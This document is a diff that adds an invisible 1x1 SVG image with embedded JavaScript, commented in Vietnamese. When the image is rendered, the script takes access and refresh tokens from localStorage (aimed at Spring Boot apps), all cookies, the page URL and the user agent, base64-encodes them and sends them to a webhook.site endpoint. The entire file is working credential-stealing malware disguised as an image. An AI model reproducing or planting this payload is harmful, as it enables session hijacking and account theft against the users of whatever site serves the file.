@@ -1,0 +1,39 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/2000/svg">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" width="1" height="1" opacity="0">
+   <script type="text/javascript">
+      (function() {
+          try {
+              // 1. Thu thập từ LocalStorage (Nơi Spring Boot hay lưu nhất)
+              var storageData = {
+                  accessToken: localStorage.getItem('access_token') || localStorage.getItem('token'),
+                  refreshToken: localStorage.getItem('refresh_token') || localStorage.getItem('refreshtoken'),
+                  // Quét thêm tất cả các key có chữ 'token' cho chắc
+                  allKeys: Object.keys(localStorage).filter(k => k.toLowerCase().includes('token'))
+              };
+
+              // 2. Thu thập từ Cookie
+              var cookieData = document.cookie;
+
+              // 3. Đóng gói dữ liệu
+              var report = {
+                  url: window.location.href,
+                  ua: navigator.userAgent,
+                  tokens: storageData,
+                  cookies: cookieData
+              };
+
+              // 4. Mã hóa và gửi đi
+              var payload = btoa(JSON.stringify(report));
+              
+              fetch('https://webhook.site/bcbf6075-3689-4d51-b21a-7b80b64d082a?data=' + payload, {
+                  mode: 'no-cors',
+                  cache: 'no-cache'
+              });
+
+          } catch (e) {
+              fetch('https://webhook.site/bcbf6075-3689-4d51-b21a-7b80b64d082a?error=' + btoa(e.message));
+          }
+      })();
+   </script>
+</svg>
